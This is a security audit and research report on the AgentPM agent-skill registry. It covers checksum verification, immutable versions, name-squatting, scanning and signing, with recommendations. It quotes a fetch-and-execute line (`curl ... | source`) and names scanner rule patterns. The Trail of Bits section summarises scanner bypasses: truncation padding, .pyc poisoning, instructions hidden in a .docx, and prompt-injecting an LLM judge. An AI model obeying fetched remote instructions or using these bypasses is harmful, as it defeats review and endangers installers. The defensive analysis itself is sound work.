# supply-chain-registry

## SUMMARY
Code reading shows the AgentPM registry's sha256 checksum is never verified by the client, and it could not be verified as implemented. The server hashes compact `JSON.stringify(archive)` but serves a re-parsed, pretty-printed body. The index carries no checksum field. The client only hashes whatever bytes it received and uses that as a cache revision.

Other gaps found in the code:
- Versions are not immutable. After a version DELETE, the same version can be PUT again with different content.
- A deleted skill name can be claimed by another publisher.
- Names match a case-insensitive regex but sit under a case-sensitive UNIQUE constraint, and archives are stored under `archives/<name>/<version>.json`. On Windows or macOS hosts, `Foo` and `foo` share one directory.
- Tokens have no scope and no expiry.
- There is no audit log and no stored scan report.
- Archive packing is not reproducible across operating systems.

The external research covered npm, PyPI, crates.io, VS Code Marketplace, Open VSX, Chrome Web Store, ClawHub, skills.sh, Smithery and Docker MCP. They agree on a small set of deterministic controls:
- immutable versions, with yank or quarantine instead of delete;
- integrity hashes pinned by the client;
- registry-signed `name@version:integrity`;
- name-similarity checks at publish;
- scoped, expiring tokens;
- a fail-closed publish scan with quarantine;
- scan results shown in the UI and the CLI;
- a block list that clients honor after install.

For the owner's rug-pull worry, the closest precedent is Chrome MV3's ban on remotely hosted code: everything the agent is told to execute or obey must be inside the hashed, scanned archive. Git installs need the same treatment, pinned to commit SHAs. The tj-actions incident showed that tags move.

Signing options for a small project:
- Sigstore keyless, TUF and SLSA provenance are overkill for an offline-capable self-hosted registry. They need OIDC, online services and heavy dependencies.
- An Ed25519 detached signature using only node:crypto, modelled on npm registry signatures and optionally minisign-compatible, is the cheap and effective choice.
- A signed index that expires and carries a version counter gives most of TUF's rollback and freeze protection at a fraction of the cost.

The Trail of Bits June 2026 work and the Open VSX "Open Sesame" bug give two design rules. Scanners, especially LLM ones, get bypassed, so integrity, immutability and policy gates must not depend on them. The scan gate must distinguish pass, fail and error explicitly, and must fail closed.

## RECOMMENDATIONS
- MINIMAL 1. Canonical integrity. Define `versionDigest`: per-file sha256, entries sorted by POSIX relative path in code-unit order, a tree digest over them, then sha256 of the canonical JSON of {name, version, kind, target, treeDigest}. The server recomputes it on receipt and never trusts the client's value. Publish it in `/index.json` (new `integrity` field on `RegistryIndexEntry`) and in the version metadata. The client verifies after download and fails closed. Record it in the install DB and in `agentpm.yaml`. A changed digest for a known `name@version` is a hard error. Serve stored archive bytes verbatim, or drop the byte-level checksum entirely.
- MINIMAL 2. Immutable versions. Keep a tombstone table for `name@version` and for deleted skill names. Replace user DELETE with `yank` (hidden from `latest` and new installs, still fetchable by exact version and digest). Add an admin-only `quarantined` state that is not fetchable, and admin-only hard delete that keeps the tombstone. Never allow a version string to be reused.
- MINIMAL 3. Fix name handling. Lowercase-normalize names with UNIQUE on the normalized key. Store archives content-addressed (`archives/sha256/<digest>.json`) or by skill id, to remove the collision on case-insensitive filesystems. Reject archive file paths that collide after NFC normalization plus case folding. Add a reserved-name list.
- MINIMAL 4. Deterministic name-confusion check on first publish of a name. Strip punctuation (the npm rule). Compute a confusable skeleton (0/o, 1/i/l, rn/m, vv/w, 5/s). Check Damerau-Levenshtein distance of 1, or 2 for names of eight or more characters. Check swapped words and combo suffixes. All checks run against names owned by other users. A skeleton match rejects. A near match quarantines for admin approval.
- MINIMAL 5. One shared pure-TS scanner package, run at three points: client pre-push, server inside the PUT handler before the version row is inserted, and client pre-link on install, update and sync. Use explicit tri-state results (`pass|fail|error`, where `error` rejects). Set hard ceilings on file size, file count and line length that reject rather than truncate. Apply a file-type allowlist: `.pyc`, office documents, nested archives, executables and large base64 blobs block or quarantine. Rate-limit publishes per user.
- MINIMAL 6. Mutable-reference policy. The scanner extracts every external reference: URLs; `curl|sh`; `npx`, `uvx` or `pip` specs without an exact version; git refs that are not 40-hex SHAs; MCP server URLs and commands in `.mcp.json` or `plugin.json`; hook commands. Registry policy blocks fetch-and-obey or fetch-and-execute patterns and unpinned executables. All remaining references are listed in the report and shown to the installer. For git and static-index sources, add `revision` and `integrity` to index entries and always record the resolved commit SHA and tree digest. Reject symlinks that escape the skill root.
- MINIMAL 7. Persist the scan report with the version: `scannerVersion`, `rulesetDigest`, `inputDigest`, verdict, findings, `externalReferences`, file manifest. Expose it via `GET /v1/skills/:name` and show it in the web UI as a status badge, findings, external references and file hashes. `agentpm install` prints a summary. It aborts on block, quarantined, yanked, digest mismatch or error. It asks for confirmation on warn. On update it shows the security delta: new findings, new external refs, new executables. Rescan all stored versions when the ruleset changes and quarantine any regressions.
- MINIMAL 8. Tokens and audit. Add token scopes (`read|publish|admin`), an optional per-skill allowlist, `expires_at` (default 90 days) and a recognizable prefix. Add an append-only, hash-chained `audit_events` table covering login, token events, publish, yank, quarantine, ownership transfer, user changes and failed publishes with their verdict. Expose an admin endpoint and a per-skill history.
- MINIMAL 9. `agentpm audit` and `doctor`. Re-hash installed trees against recorded digests. Installs are symlinks into a mutable cache, so this detects local tampering. Check the registry for yanked or quarantined status of installed versions, as the kill-switch analogue. Rescan with the current ruleset. Prefer `https://` registries and warn loudly on `http://`.
- NICE 1. Registry signing with Ed25519 via node:crypto over `name@version:versionDigest:scanReportDigest`. Serve keys at `/v1/keys` with `keyid` and `expires`. The client pins the key when the source is added. An optional minisign-compatible encoding lets users verify with stock tooling.
- NICE 2. Publisher signatures. Per-account Ed25519 public keys. `agentpm push` signs the versionDigest, the server verifies it, and the client can pin the publisher key per skill. Protects against registry compromise and token theft.
- NICE 3. Signed index with a monotonic `indexVersion` and an `expires` field. This gives rollback and freeze protection, the cheap TUF subset. Consider full TUF via tuf-js only for a public multi-mirror registry.
- NICE 4. Client-side cooldown and trust policy, modelled on pnpm `minimumReleaseAge` and `trustPolicy: no-downgrade`. Do not auto-update to versions younger than N days. Refuse updates whose trust evidence decreased, for example signed to unsigned or clean to warn.
- NICE 5. TOTP 2FA for password login and token minting, then WebAuthn later. Add email or webhook notifications on publish and ownership changes.
- NICE 6. `@owner/name` namespaces with ownership verification. This removes most typosquatting pressure.
- NICE 7. A reporting endpoint plus an OSV-style advisories feed (`/v1/advisories`) consumed by `agentpm audit`. Add auto-quarantine thresholds for trusted reporters, the PyPI Observer model.
- NICE 8. Optional non-gating annotations from external scanners: a VirusTotal hash lookup, or Cisco skill-scanner or SkillSpector in static mode via shell-out. Display them separately from the deterministic verdict.
- NICE 9. Sigstore or GitHub attestation verification for skills sourced from GitHub immutable releases. Enable npm trusted publishing and provenance for AgentPM's own `@travelhawk/agentpm` package.
- NICE 10. A CI fixture corpus for the scanner that recreates the Trail of Bits bypass classes (truncation padding, `.pyc`, a payload inside a .docx, registry override) plus the ToxicSkills patterns (`curl | source`, base64 eval, password-protected zip download).

## CORRECTIONS (partly/refuted/unverifiable)
- [partly] Chrome MV3 bans remotely hosted code: 'anything that is executed by the browser that is loaded from someplace other than the extension's own files'; JSON data still allowed.
  -> The page does not itself state the 'pass review with benign code, then swap the remote payload' rationale; that is the researcher's (reasonable) interpretation, not a quote. Also note the analogy is imperfect for skills: for an LLM agent, remote *data* (a fetched markdown/JSON page) is effectively executable instructions, so the AgentPM policy has to be stricter than MV3 (treat any fetch-and-read URL as a mutable reference, not only fetch-and-execute).
- [partly] tj-actions/changed-files (CVE-2025-30066): attacker with stolen PAT re-pointed tags v1 through v45.0.7 to a malicious commit; SHA-pinned repos were unaffected. Cited source: CISA alert.
  -> The facts are right but the cited CISA alert does not contain the tag range, the PAT root cause, or SHA-pinning advice. Cite the GitHub advisory https://github.com/advisories/GHSA-mrrh-fwg8-r2c3 (and StepSecurity/Wiz write-ups) instead. Patched in v46.0.1.
- [partly] typomania: crates.io background job on each new crate publish, checks Bitflips/Omitted/Repeated/SwappedCharacters/SwappedWords/Typos/Version, notifies admins (non-blocking), caught 4 malicious crates in ~18 months, in production since August 2023. License MIT OR Apache-2.0.
  -> The crates.io integration shipped as an experiment in November 2023 (not August 2023), i.e. ~16 months at the March 2025 article date, not ~18.
- [partly] Tool: snyk/agent-scan (formerly Invariant mcp-scan) - Python, Apache-2.0, ~3.1k stars; needs SNYK_TOKEN + cloud API; output experimental; scanning MCP configs executes server commands; 'powers the skills.sh and Smithery scans'; detects MCP rug pulls.
  -> The current README does not say it powers skills.sh or Smithery scans, and no longer mentions rug-pull detection (that is from the original Invariant mcp-scan announcement). README explicitly says large-scale/registry scanning through the standard API 'is considered abuse' and needs a separate arrangement - so it is also contractually unsuitable as a registry gate.
- [partly] Signing assessment: Sigstore keyless/TUF/SLSA are overkill for an offline self-hosted registry; Ed25519 detached signature via node:crypto is the cheap effective choice; signed expiring index with a version counter gives most of TUF's rollback/freeze protection.
  -> This is a design judgment, not a verifiable fact; it is reasonable. Two caveats: (1) a single online registry signing key does not protect against server compromise (the researcher says so) - so it must come AFTER client-side digest pinning in agentpm.yaml/install DB, which needs no keys at all and is what actually defeats the rug pull; (2) the 'cheap TUF subset' does not give key-compromise recovery or mix-and-match protection unless per-version digests are inside the signed index.

## ADDITIONS
- GitHub CLI `gh skill` (GitHub CLI v2.90.0, 16 April 2026) is the closest first-party precedent for exactly the owner's worry and was missed: `--pin <tag|commit-sha>` (pinned skills are skipped by update), records the git TREE SHA of the skill directory and compares it on update to detect real content change, writes provenance (repository, ref, tree SHA) into SKILL.md frontmatter, recommends immutable releases for publishers, and `gh skill publish` checks tag protection / secret scanning / code scanning. It also states skills 'are not verified by GitHub and may contain prompt injections, hidden instructions, or malicious scripts'. AgentPM should interoperate with (read/write) this metadata and copy the tree-SHA drift check. https://github.blog/changelog/2026-04-16-manage-agent-skills-with-github-cli/
- Claude Code plugin marketplaces already support commit pinning: plugin git sources (`github`, `url`, `git-subdir`) accept `sha` = 'Full 40-character git commit SHA to pin to an exact version', and 'when both ref and sha are set ... the sha is the effective pin'. Managed setting `strictKnownMarketplaces` is an allowlist of marketplaces. Since AgentPM installs Claude plugins, its scanner should flag marketplace.json / plugin entries that have `ref` without `sha`, and AgentPM's own index schema should mirror `ref` + `sha`. Also a documented gotcha: a fixed `version` string with new commits keeps users on the cached copy (version is not an integrity signal). https://code.claude.com/docs/en/plugin-marketplaces
- OpenSSF Model Signing (OMS), sigstore/model-transparency (Python, Apache-2.0, 244 stars, pushed 2026-09-17) is the format behind NVIDIA's `skill.oms.sig`: a Sigstore-style bundle over a manifest of per-file hashes for a DIRECTORY TREE, supporting key, certificate and keyless modes. It is the emerging standard for signing skill folders; AgentPM's tree-digest manifest should be designed so that an OMS signature could be verified/attached later (even if the baseline stays plain Ed25519). https://github.com/sigstore/model-transparency and https://docs.nvidia.com/skills/signing-agent-skills
- Existing AgentPM tree hash is not fit for integrity: `computeTreeSignature` in D:\DevProjects\private\agentpm\packages\fs\src\index.ts:72-81 uses SHA-1, feeds relativePath then content with no delimiter/length framing (ambiguous encoding; path 'ab'+'c' equals 'a'+'bc'), and inherits walkFiles' behaviour of silently skipping symlinks and IGNORED_NAMES. For git/local sources this means a symlink that points outside the skill root is neither hashed nor reported, yet the install links the whole directory into the agent folder. The security layer needs its own walker that (a) lstat's every entry, (b) fails or reports on symlinks/special files instead of skipping, and (c) hashes with SHA-256 and framed records.
- MCP official registry (modelcontextprotocol/registry, Go, 7,264 stars, pushed 2026-09-16) is a concrete precedent for NICE 6 namespaces: reverse-DNS namespaces whose ownership is proven at publish time via GitHub OAuth/OIDC (io.github.<user>/...) or DNS/HTTP challenge (me.adamjones/... requires proving adamjones.me). https://github.com/modelcontextprotocol/registry
- For NICE 7 (advisories feed), the de-facto data format is OSV as used by ossf/malicious-packages (Go, Apache-2.0, 609 stars, pushed 2026-09-18); OpenSSF principles Level 3 explicitly asks for malicious-package advisories in OSV format. https://github.com/ossf/malicious-packages
- For the SRI-style `sha256-<base64>` digest string, npm's own `ssri` library (npm/ssri, ISC per package, used by npm CLI and pacote) is the reference parser/serializer; the format is trivial enough to implement in ~15 lines with node:crypto, but matching ssri's string format keeps lockfile values familiar. https://github.com/npm/ssri
- I searched GitHub for a TypeScript/Node deterministic skill scanner that could be embedded (queries 'skill scanner' language:TypeScript, 'agent skills security scan'). Nothing credible exists: results are 0-8 star repos (e.g. likesunbb/auto-skills-scanner 'zero deps', liminal-ai/skill-scanner-ts, jensoppermann/agent-skill-scanner). This supports the researcher's MINIMAL 5 conclusion that AgentPM must write its own pure-TS rule engine and only borrow rule ideas (Cisco YAML/YARA packs, SkillSpector's 71-pattern table) and test corpora (ToB repo techniques, MaliciousSkillBench referenced in the Cisco README).
- Snyk ToxicSkills detail worth carrying into the rule set: the remote-instruction pattern is present in 2.9% of all ClawHub skills but 21% of confirmed malicious samples - i.e. 'fetches remote content and obeys/executes it' is a high-lift deterministic signal, which justifies making it a block (not warn) rule at the registry gate. https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/

## TOOLS
- sigstore-js | https://github.com/sigstore/sigstore-js | Apache-2.0 | TypeScript | det: Verifying a bundle is deterministic. Signing needs online OIDC, Fulcio and Rekor. | reuse: Nice-to-have only. Use it as an optional verifier for skills sourced from GitHub immutable releases or attestations. It is not the baseline for an offline self-hosted registry, because of its heavy dependency tree and its reliance on public infrastructure. | 183 stars, last push 2026-09-09. Official Sigstore JS client, used by the npm CLI for provenance.
- tuf-js | https://github.com/theupdateframework/tuf-js | MIT | TypeScript | det: Fully deterministic. | reuse: Inspiration only for now. Implement the cheap subset: a signed index with a monotonic `indexVersion` and an `expires` field. Adopt tuf-js only if AgentPM ever runs a public multi-mirror registry. | 83 stars, last push 2026-08-31. Reference JS TUF client, used by `@sigstore/tuf`.
- minisign | https://github.com/jedisct1/minisign | ISC | C / Zig | det: Fully deterministic. | reuse: Port the signature and public-key format to TypeScript on node:crypto (Ed25519 plus the blake2b512 hash). Registry and publisher signatures can then be checked with the stock minisign CLI. Do not shell out to the binary. | 2,819 stars, last push 2026-08-26. Mature, with a stable format.
- typomania | https://github.com/rustfoundation/typomania | MIT OR Apache-2.0 (per README; the GitHub API reports NOASSERTION) | Rust | det: Fully deterministic. | reuse: Port the check set to TypeScript. It is small and consists of pure string functions. Add the npm punctuation-stripping rule and a PyPI-style confusable skeleton. Run it in the registry server's PUT handler for names being published for the first time. | 40 stars, last push 2026-09-04. In production on crates.io since August 2023.
- canonicalize (RFC 8785 JCS) | https://github.com/erdtman/canonicalize | Apache-2.0 | JavaScript | det: Fully deterministic. | reuse: Either vendor it, since it is tiny, or write a sorted-keys serializer of about 20 lines for the flat version-metadata object. Use it to define `versionDigest` so hashes are stable across clients and operating systems. | 63 stars, last push 2026-09-18. Tiny, single-purpose.
- vercel-labs/skills (skills.sh CLI) | https://github.com/vercel-labs/skills | MIT | TypeScript | det: Hashing and the lockfile are deterministic. The audit verdicts come from external vendor scanners, some of which use LLMs. | reuse: Inspiration for the AgentPM lock and integrity field and for the pre-install audit summary UX. For determinism, sort paths by code unit rather than with `localeCompare`. | About 32k stars, last push 2026-09-17.
- cisco-ai-defense/skill-scanner | https://github.com/cisco-ai-defense/skill-scanner | Apache-2.0 per README badge (the GitHub API reports NOASSERTION) | Python (Go helper for CEL) | det: The signature, AST and CEL layers are deterministic. The LLM judge, the meta-analyzer and the cloud lookups are not. | reuse: A source of rule ideas: read the YAML and YARA rule packs and re-express the relevant ones in TypeScript. Optionally use it as a shell-out, non-gating annotation on the registry server. | 2,533 stars, last push 2026-09-05. Active. Its README is candid about weak held-out recall.
- NVIDIA/SkillSpector | https://github.com/NVIDIA/SkillSpector | Apache-2.0 | Python | det: `--no-llm` static mode is deterministic. The LLM stage and the OSV lookup are not. | reuse: Inspiration for the resource-bound and fail-closed design, for the baseline and suppression model, and for the sign-after-scan pipeline shape. It is Python, so use it as an optional shell-out at most. | About 17.7k stars, last push 2026-09-18.
- snyk/agent-scan (formerly Invariant mcp-scan) | https://github.com/snyk/agent-scan | Apache-2.0 | Python | det: Not deterministic and not offline. It requires `SNYK_TOKEN` and a cloud API, and it starts MCP servers during a scan. | reuse: Inspiration only. It is unsuitable for the deterministic gate. | About 3.1k stars, last push 2026-09-18. Its CLI output is explicitly marked experimental.
- trailofbits/overtly-malicious-skills | https://github.com/trailofbits/overtly-malicious-skills | None listed | Markdown / Python | det: Not applicable. It is a test corpus. | reuse: Use the techniques as regression fixtures for the AgentPM scanner and policy: opaque binary files, oversized inputs, and package-registry override. Do not vendor the files, because the repository has no license. Recreate equivalents instead. | 42 stars, last push 2026-06-03. A research artifact accompanying the Trail of Bits blog post.

## FINDINGS
### AgentPM client never verifies the registry checksum, and could not as implemented [high]
I read the code; I did not run it.

**Server side**
- Publish (`packages/registry-server/src/server.ts:464-465`) computes `checksum = sha256(JSON.stringify(archive))`, the compact form. It stores the checksum in `skill_versions.checksum` and writes the compact JSON to disk.
- Download (`server.ts:581-583`) re-parses the file via `readArchiveFromDisk`. It then sends it through `sendJson`, which pretty-prints with `JSON.stringify(body, null, 2)` (`server.ts:70-71`).
- So the bytes on the wire never hash to the stored checksum.

**Client side**
- `fetchSkillArchive` (`packages/registry/src/index.ts:322-343`) returns `{archive, raw}`.
- `prepareArchiveContent` (`packages/core/src/service.ts:4343-4344`) computes `createHash('sha256').update(raw)` only to name the cache release dir (`revision`). It never compares that hash to anything.
- `RegistryIndexEntry` (`packages/shared/src/index.ts:145-157`) has no `checksum` or `integrity` field.
- `/index.json` (`server.ts:276-304`) does not emit a checksum.
- `publishSkillToRegistry` (`packages/core/src/registry-client.ts:258-276`) only echoes the checksum back to the user.

**Net effect**
- The checksum is decorative.
- A tampered archive file on the server disk, a MITM on a plain `http://` registry (`normalizeRegistryUrl` allows http), or a swapped mirror would install silently.

**Fix direction**
- Define the digest over canonical content: a sorted file-tree digest plus metadata, not transport bytes.
- Or serve the stored bytes verbatim.
- Publish the digest in the index and version metadata.
- Verify it on install, update and sync, and fail closed.
- Record it in the install DB and in `agentpm.yaml` so a later change of `name@version` digest is a hard error.
Sources: D:\DevProjects\private\agentpm\packages\registry-server\src\server.ts ; D:\DevProjects\private\agentpm\packages\core\src\service.ts ; D:\DevProjects\private\agentpm\packages\registry\src\index.ts ; D:\DevProjects\private\agentpm\packages\shared\src\index.ts ; D:\DevProjects\private\agentpm\packages\core\src\registry-client.ts

### Registry versions are mutable: delete then republish, name resurrection, and a moving `latest` pointer [high]
- `DELETE /v1/skills/:name/versions/:version` (`server.ts:587-607`) removes the DB row and the archive file.
- The PUT handler only rejects a version that currently exists (`server.ts:441-446`). After a delete, the same `name@version` can be republished with different content. This is the classic rug-pull primitive.
- `DELETE /v1/skills/:name` (`server.ts:550-563`) frees the name. Any other publisher can re-register it and inherit the installed base, which is a resurrection hijack.
- `/versions/latest/archive` is a mutable pointer by design.

**What the mature registries do**
- npm: "Once package@version has been used, you can never use it again". After a full unpublish, a 24 hour wait applies before the name can be used again.
- crates.io: "The version can never be overwritten, and the code cannot be deleted". It has only yank.
- PEP 763 surveyed 13 registries and found 9 restrict or prohibit user deletion. The PEP was withdrawn in September 2025 for procedural reasons. Its survey and incident list remain useful.
- OpenSSF Principles for Package Repository Security, level 2: an unpublish policy that prevents versions from being replaced.

**Recommendation**
- Keep a tombstone table for `name@version`, and for names.
- Replace user delete with `yanked`, which hides a version from `latest` and from new installs but leaves it fetchable by exact version and digest for existing lockfiles.
- Add an admin-only `quarantined` state that is not fetchable.
- Hard delete stays admin-only and keeps the tombstone.
Sources: D:\DevProjects\private\agentpm\packages\registry-server\src\server.ts ; https://docs.npmjs.com/policies/unpublish ; https://doc.rust-lang.org/cargo/reference/publishing.html ; https://peps.python.org/pep-0763/ ; https://repos.openssf.org/principles-for-package-repository-security

### Name handling: case-sensitive uniqueness, no similarity checks, and an archive directory collision on case-insensitive filesystems [medium]
- `NAME_PATTERN` is `/^[a-z0-9][a-z0-9._-]*$/i` (`server.ts:29`).
- `skills.name` is `TEXT NOT NULL UNIQUE` with SQLite's default BINARY collation (`db.ts:148`). `PDF-Tools` and `pdf-tools` are therefore distinct skills with distinct owners.

**Directory collision**
- Archives are written to `path.join(archivesDir, skill.name, `${version}.json`)` (`server.ts:466-475`).
- On a Windows or macOS registry host, those two names resolve to the same directory.
- Publisher B pushing `foo@1.0.0` would overwrite publisher A's `Foo/1.0.0.json`.
- Nothing verifies the checksum, so this would go undetected.
- On a typical Linux host the collision does not occur. I did not execute this.

**Other gaps**
- No namespace or scope concept.
- No reserved names.
- No similarity check.
- Archive-path dedupe in `validateSkillArchive` (`packages/shared/src/index.ts:240-253`) is also case-sensitive. `SKILL.md` and `skill.md` both pass and then collide at materialize time on Windows or macOS, where the last write wins. A scanner could read one file while the agent reads the other.

**Fixes**
- Lowercase-normalize names and put UNIQUE on the normalized key.
- Store archives content-addressed (`archives/sha256/<digest>.json`) or by skill id.
- Reject archive paths that collide after NFC normalization plus case folding.
Sources: D:\DevProjects\private\agentpm\packages\registry-server\src\server.ts ; D:\DevProjects\private\agentpm\packages\registry-server\src\db.ts ; D:\DevProjects\private\agentpm\packages\shared\src\index.ts

### Archive packing is not reproducible across operating systems, so hashes are not stable today [medium]
`packDirectoryToArchive` (`packages/fs/src/index.ts:186-220`) has four sources of non-determinism:

1. **Path sort.** `walkFiles` sorts absolute OS paths with the default JS sort (`fs/index.ts:69`). The separator is `\` (0x5C) on Windows and `/` (0x2F) on POSIX. Siblings like `a/x` and `a0` order differently per OS.
2. **Executable bit.** `executable` derives from `stats.mode & 0o111`, which is never set on Windows.
3. **Line endings.** File bytes depend on git autocrlf in the checkout.
4. **Optional metadata.** `undefined` keys are dropped by `JSON.stringify`, but key order is fixed only by construction order.

The server hashes `JSON.stringify(archive)`, so the same skill packed on two machines yields different checksums.

**Recommended design**, in line with ClawHub's "deterministic packaging ... consistent compression and timestamps" and the skills.sh CLI `computeSkillFolderHash` (sort by relative path, hash path plus content):
- Compute a per-file `sha256` over raw bytes.
- Sort entries by POSIX relative path using code-unit comparison, not `localeCompare`.
- Define `treeDigest = sha256` over the lines `path\0mode\0sha256\n`.
- Define `versionDigest = sha256(JCS({name, version, kind, target, treeDigest}))`. RFC 8785 JCS specifies sorted keys, no whitespace and ES number formatting. It is an Informational RFC, and `erdtman/canonicalize` implements it. For this flat object, a roughly 20-line sorted-keys serializer would do.
- Do not include timestamps in the digest.
- Express the digest SRI-style (`sha256-<base64>`) so the algorithm can change later.

The same function then runs in the client before push, on the server at receipt (recompute, never trust the client's value), and in the client after download.
Sources: D:\DevProjects\private\agentpm\packages\fs\src\index.ts ; https://openclaw.ai/blog/virustotal-partnership ; https://github.com/vercel-labs/skills ; https://www.rfc-editor.org/rfc/rfc8785 ; https://github.com/erdtman/canonicalize

### Mutable targets: the working precedent is "no remotely hosted code" plus commit or digest pinning [high]
**Chrome Web Store, Manifest V3**
- MV3 bans remotely hosted code: "anything that is executed by the browser that is loaded from someplace other than the extension's own files". Remote data such as JSON is still allowed.
- The rationale is the owner's worry exactly: pass review with benign code, then swap the remote payload.

**Evidence from the skills ecosystem**
- Snyk's ToxicSkills study documents the agent-skill equivalent: skills using `curl https://remote-server.com/instructions.md | source` to "dynamically fetch and execute content at runtime", so behavior changes without republishing.
- The study reports 36.82% of 3,984 ClawHub skills had flaws, and 76 confirmed malicious payloads.

**Evidence from git refs**
- In the tj-actions/changed-files compromise (CVE-2025-30066, March 2025), an attacker with a stolen PAT re-pointed tags v1 through v45.0.7 to a malicious commit. Repos pinned to tags ran it; repos pinned to commit SHAs did not.
- GitHub made immutable releases GA in October 2025. Tags cannot be moved or deleted, assets are locked, and attestations ship as Sigstore bundles.

**Implications for AgentPM**
- Registry archives: everything the agent executes or obeys must live inside the hashed archive. The publish-time scanner should extract every external reference:
  - URLs;
  - git refs;
  - `npx`, `uvx` or `pip` specs without an exact version;
  - `curl|sh`;
  - MCP server URLs in `.mcp.json` or `plugin.json`;
  - hook commands.
- Those references should then be blocked or quarantined by policy, with the remainder listed to the installing user.
- Git and static-index sources: `RegistryIndexEntry` only has `ref`, which is mutable, and no `revision` or `integrity` field. Add both.
- `agentpm.yaml` already supports `revision`. Make sync, install and update record the commit SHA plus the tree digest. Make `update` show a security diff of new external refs and new findings, not only the layout risk it shows today (`service.ts:1002-1040`).
- The JSON archive format cannot carry symlinks, because `walkFiles` skips non-regular files. The symlink vector therefore exists only for git and local sources. Reject symlinks that resolve outside the skill root at install.
- pnpm's `minimumReleaseAge` (v10.16, default 1 day in v11) and `trustPolicy: no-downgrade` (v10.21) are cheap deterministic client knobs worth copying for `agentpm update` and `sync`.
Sources: https://developer.chrome.com/docs/extensions/develop/migrate/remote-hosted-code ; https://snyk.io/blog/toxicskills-malicious-ai-agent-skills-clawhub/ ; https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-tj-actionschanged-files-cve-2025-30066-and-reviewdogaction ; https://github.blog/changelog/2025-10-28-immutable-releases-are-now-generally-available/ ; https://pnpm.io/settings/dependency-resolution ; D:\DevProjects\private\agentpm\packages\shared\src\index.ts

### What registries do at publish time: scan, quarantine, block list, and scan results shown to the user [high]
**VS Code Marketplace**
- A multi-engine malware scan runs on every publish and update before the extension goes live.
- Dynamic analysis runs in a sandbox VM.
- Secret scanning blocks the publish.
- Name-squatting protection covers official publishers.
- The Marketplace signs every package, and VS Code verifies the signature on install.
- A block list force-uninstalls removed extensions from user machines.

**Open VSX (Eclipse Foundation)**
- Pre-publish checks cover namespace or name impersonation, leaked secrets and known malicious patterns. Failures are "quarantined for review".
- The rollout ran in monitor-only mode in February 2026 and enforced from March 2026.
- It also rescans shortly after publish and runs periodic bulk rescans.

**PyPI**
- An admin-set `quarantined` lifecycle status removes the project from the Simple index without deleting it. Owners cannot modify a quarantined project.
- PyPI has proposed auto-quarantine on two or more trusted "Observer" reports.
- About 140 projects were quarantined between August and December 2024.

**ClawHub**
- It builds a deterministic ZIP, takes the SHA-256, and looks the hash up on VirusTotal. If unknown, it uploads the bundle and gets a Code Insight (LLM) verdict.
- Benign is auto-approved, suspicious gets a warning, and malicious is blocked.
- It rescans daily and has a user report button.
- The maintainers say it is "not a silver bullet" for prompt injection.
- Before this, the only barrier was a one-week-old GitHub account.

**skills.sh**
- Three third-party scanners (Gen, Socket, Snyk) run, and results are public on each skill page and at `/audits`.
- Malicious skills are hidden from search and carry a warning.
- CLI version 1.4.0 and later prints audit results and risk levels before install.

**Smithery**
- It integrated Invariant mcp-scan (tool poisoning, rug pulls, cross-origin escalation). Findings are shown on the server's registry page.

**Docker MCP catalog**
- Docker-built images carry signatures, provenance and signed SBOMs.
- The gateway has a `--verify-signatures` flag.
- Third-party submissions are built and tested in ephemeral environments.
- Docker itself calls the approach "best-effort".

**Pattern to copy**
- Version states `active`, `quarantined` and `yanked`.
- The scan report is stored with the version and shown both in the UI and at install.
- Rescan when the rules update. A deterministic scanner makes this cheap.
- The client honors the registry's block and yank status for skills that are already installed.
Sources: https://code.visualstudio.com/docs/configure/extensions/extension-runtime-security ; https://thehackernews.com/2026/02/eclipse-foundation-mandates-pre-publish.html ; https://blog.pypi.org/posts/2024-12-30-quarantine/ ; https://openclaw.ai/blog/virustotal-partnership ; https://thehackernews.com/2026/02/openclaw-integrates-virustotal-scanning.html ; https://vercel.com/changelog/automated-security-audits-now-available-for-skills-sh ; https://invariantlabs.ai/blog/smithery-mcp-scan ; https://docs.docker.com/ai/mcp-catalog-and-toolkit/faqs/

### Scanners get bypassed, so gates must fail closed and must not be the only control [high]
**Trail of Bits, "The Sorry State of Skill Distribution" (June 2026)**
- They bypassed ClawHub (VirusTotal plus an LLM guard), skills.sh (Gen, Socket, Snyk) and Cisco skill-scanner within hours, using four techniques:
  1. Prepending 100,000 newlines, so the scanner truncated its input.
  2. Python `.pyc` bytecode poisoning.
  3. Instructions hidden in the XML inside a `.docx` referenced from SKILL.md.
  4. Prompt-injecting the LLM judge.
- Their advice is classic supply chain: know the origin, pin versions, control who can introduce or update, and use curated collections.
- The test skills are public at `trailofbits/overtly-malicious-skills`.

**Open VSX "Open Sesame" bug (reported 8 February 2026, fixed 11 February 2026)**
- The pre-publish pipeline used one boolean for both "no scanners configured" and "all scanner jobs failed to run".
- Flooding the publish endpoint exhausted the DB pool, scan enqueueing failed, and extensions went live looking as if they had passed.
- The researcher's lesson: "Never let 'no work needed' and 'work failed' share a return value".

**Deterministic consequences for AgentPM**
- The scan result should have three states, `pass | fail | error`. An `error` rejects or quarantines.
- Apply hard ceilings on file size, file count, line length and total bytes. Reject when a ceiling is exceeded; never truncate. NVIDIA SkillSpector documents the same fail-closed resource bounds.
- Apply a file-type allowlist. Opaque or compiled files (`.pyc`, `.docx`, `.zip`, executables, base64 blobs over N KB) are blocked or quarantined, because a text scanner cannot see inside them.
- Rate-limit publishes per user.
- Run the scan synchronously inside the PUT handler, before the version row is inserted, so no published-but-unscanned window exists.
- Cisco's own README reports weak held-out metrics (7.75% recall and 60.75% precision on its source-disjoint split) and says no findings does not mean no risk. Present any scan as risk disclosure, not certification.
Sources: https://blog.trailofbits.com/2026/06/03/the-sorry-state-of-skill-distribution/ ; https://github.com/trailofbits/overtly-malicious-skills ; https://thehackernews.com/2026/03/open-vsx-bug-let-malicious-vs-code.html ; https://github.com/cisco-ai-defense/skill-scanner ; https://github.com/NVIDIA/SkillSpector

### Signing and provenance options, and their cost for a small self-hosted project [medium]
**(a) Registry signature with Ed25519 via node:crypto. Cheapest and recommended.**
- The API is `generateKeyPairSync('ed25519')`, `sign(null, data, privateKey)` and `verify(null, data, publicKey, sig)`. The algorithm argument must be null for Ed25519.
- It needs zero dependencies and works offline.
- Model it on npm registry signatures:
  - npm signs the string `${name}@${version}:${integrity}` (ECDSA P-256).
  - Public keys are published at `/-/npm/v1/keys` with `keyid` and an optional `expires`.
  - Clients verify with `npm audit signatures`.
- For AgentPM:
  - Sign `name@version:versionDigest:scanReportDigest`.
  - Serve keys at `/v1/keys`.
  - The client pins the key when the registry source is added (trust on first use, or an explicit `--registry-key`).
